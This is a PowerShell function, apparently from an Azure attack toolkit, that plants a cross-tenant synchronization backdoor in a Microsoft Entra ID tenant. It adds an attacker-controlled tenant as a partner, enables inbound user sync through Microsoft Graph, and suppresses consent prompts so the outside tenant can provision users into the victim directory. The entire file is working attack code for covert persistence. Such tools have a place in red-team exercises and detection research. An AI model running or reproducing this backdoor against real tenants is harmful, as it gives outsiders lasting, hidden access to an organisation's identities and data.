#Backdoor using Cross Tenant Synchronization
<#
    .NOTES
    Roles required: Global administrator or Security administrator role.
    Ref: https://learn.microsoft.com/en-us/azure/active-directory/external-identities/cross-tenant-access-overview
#>
function CTSBackdoor {
    mitre_details("CTSBackdoor")

    $tenants = Get-AzTenant
    MAADWriteProcess "Available tenants:"
    foreach ($tenant in $tenants){
        MAADWriteProcess "$($tenant.Name) : $($tenant.Id)"
    }
    MAADWriteProcess ""

    #Enter details for source tenant (attacker controlled tenant)
    $ExternalTenantId = Read-Host -Prompt "`n[?] Enter tenant ID of external tenant (backdoor tenant)"
    Write-Host ""

    if ($null -eq $ExternalTenantId) {
        MAADWriteError "ExternalTenantId cannot be null"
        MAADWriteProcess "Exiting backdoor module now"
        break
    }

    #Deploy config
    $Param1 = @{
        TenantId = $ExternalTenantId
    }

    try {
        New-MgPolicyCrossTenantAccessPolicyPartner -BodyParameter $Param1 | Format-List
        MAADWriteProcess "1/3 -> Added source(backdoor) tenant to target tenant"
    }
    catch {
        MAADWriteError "1/3 Failed to add source tenant to target tenant"
    }
    
    #Enabling user synchronization in the target tenant
    $Param2 = @{
        userSyncInbound = @{
            isSyncAllowed = $true
        }
    }

    try {
        Invoke-MgGraphRequest -Method PUT -Uri "https://graph.microsoft.com/v1.0/policies/crossTenantAccessPolicy/partners/$ExternalTenantId/identitySynchronization" -Body $Param2
        MAADWriteProcess "2/3 -> Enabled user synchronization in target tenant"
    }
    catch {
        MAADWriteError "2/3 Failed to enable user synchronization in target tenant"
    }
    
    #Verify config deployed successfully to proceed to next step
    if ((Get-MgPolicyCrossTenantAccessPolicyPartnerIdentitySynchronization -CrossTenantAccessPolicyConfigurationPartnerTenantId $ExternalTenantId).UserSyncInbound.isSyncAllowed -eq $true) {
        #automatically redeem invitations and suppress consent prompts for inbound access
        $AutomaticUserConsentSettings = @{
            "InboundAllowed"="True"
        }
        Update-MgPolicyCrossTenantAccessPolicyPartner -CrossTenantAccessPolicyConfigurationPartnerTenantId $ExternalTenantId -AutomaticUserConsentSettings $AutomaticUserConsentSettings
        MAADWriteProcess "3/3 -> Setup automatic invitation redemption in target tenant"
        MAADWriteInfo "To establish backdoor access - Deploy CTS in source tenant & provision users in this target tenant"
        MAADWriteSuccess "Backdoor Config Deployed in Target Tenant"
    }
    else {
        MAADWriteError "3/3 Failed to deploy config"
    }
}